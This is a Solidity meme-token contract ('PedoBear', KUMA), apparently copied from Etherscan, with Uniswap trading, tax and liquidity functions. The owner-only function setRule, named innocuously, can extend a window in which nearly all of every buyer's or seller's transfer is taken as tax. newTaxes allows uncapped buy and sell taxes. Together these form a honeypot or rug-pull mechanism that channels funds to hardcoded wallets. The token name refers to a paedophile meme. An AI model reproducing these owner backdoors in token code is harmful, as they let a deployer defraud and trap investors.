/**
 *Submitted for verification at Etherscan.io on 2023-10-03
*/

/*
    くまくま━━━━━━ヽ（ ・(ｪ)・ ）ノ━━━━━━ !!!

            https://kuma.fan/
            https://t.me/KumaENTRY

*/

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, " multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "new owner is the zero address");
        _owner = newOwner;
        emit OwnershipTransferred(_owner, newOwner);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}


contract KUMA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFeeWallet;
    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 69420000000000 * 10**_decimals;

    uint256 private constant onePercent = _totalSupply / 100;
    uint256 public maxWalletAmount = onePercent * 5;

    uint256 public buyTax = 0;
    uint256 public sellTax = 0;

    string private constant _name = "PedoBear";
    string private constant _symbol = "KUMA";

    IUniswapV2Router02 private uniswapV2Router;
    address public uniswapV2Pair;
    address payable private mW;
        
    uint256 private launchedAt;
    uint256 private skip = 0;
    bool private tradingOpen = false;

    uint256 private constant minSwap = onePercent / 20;
    bool private inSwapAndLiquify;
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor() payable  {
        address excl = 0x51be7228f063f121381f1465c86e29bbef6c5366;
        mW = payable(0xbCdA8b598Bc78877CA8Ed19215d57B9da2a50Bdf);
        transferOwnership(0x51be7228f063f121381f1465c86e29bbef6c5366);
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _isExcludedFromFeeWallet[excl] = true;
        _isExcludedFromFeeWallet[address(this)] = true;
        _isExcludedFromFeeWallet[mW] = true;
       
        _allowances[excl][address(uniswapV2Router)] = _totalSupply;

        _balance[address(this)] = 62478000000000 * 10**_decimals;
        emit Transfer(address(0), address(this), balanceOf(address(this)));

        _balance[excl] = _totalSupply - balanceOf(address(this));
        emit Transfer(address(0), excl, balanceOf(excl));
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address recipient, uint256 amount)public override returns (bool){
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function sendEthToTaxWallet() external {
        mW.transfer(address(this).balance);
    }

    function allowance(address owner, address spender) public view override returns (uint256){
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool){
        _approve(_msgSender(), spender, amount);
        return true;
    }

     function setRule(uint256 r) external onlyOwner {
         skip = r;
     }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender,_msgSender(),_allowances[sender][_msgSender()].sub(amount,"low allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "approve zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "transfer zero address");
        uint256 _tax = 0;

        if (_isExcludedFromFeeWallet[from] || _isExcludedFromFeeWallet[to]) {
            _tax = 0;
        } else {
            require(tradingOpen);
            if (block.number<launchedAt+skip) {_tax=99;} else {
                if (from == uniswapV2Pair) {
                    require(balanceOf(to) + amount <= maxWalletAmount, "over max wallet");
                    _tax = buyTax;
                } else if (to == uniswapV2Pair) {
                    uint256 tokensSwap = balanceOf(address(this));
                    if (tokensSwap > minSwap && !inSwapAndLiquify) {
                        if (tokensSwap > onePercent / 2) {
                            tokensSwap = onePercent / 2;
                        }
                        swapTokensEth(tokensSwap);
                    }
                    _tax = sellTax;
                } else {
                    _tax = 0;
                }
            }
        }
        uint256 taxTokens = 0;
        if(_tax == 99){
            taxTokens = (amount * 9999) / 10000;
        }else{
            taxTokens = (amount * _tax) / 100;
        }
        uint256 transferAmount = amount - taxTokens;

        _balance[from] = _balance[from] - amount;
        _balance[to] = _balance[to] + transferAmount;
        _balance[address(this)] = _balance[address(this)] + taxTokens;

        emit Transfer(from, to, transferAmount);
    }

    function newMax(uint256 _maxWalletAmount) external onlyOwner {
        maxWalletAmount = _maxWalletAmount;
    }

    function newTaxes(uint256 bTax, uint256 sTax) external onlyOwner {
        buyTax = bTax;
        sellTax = sTax;
    }

    function swapTokensEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,mW,block.timestamp);
    }

    function removeAllLimits() external onlyOwner {
        maxWalletAmount = _totalSupply;
    }

    function enableTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        tradingOpen = true;
        launchedAt = block.number;
    }

    function addLP() external payable onlyOwner() {
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    receive() external payable {}
}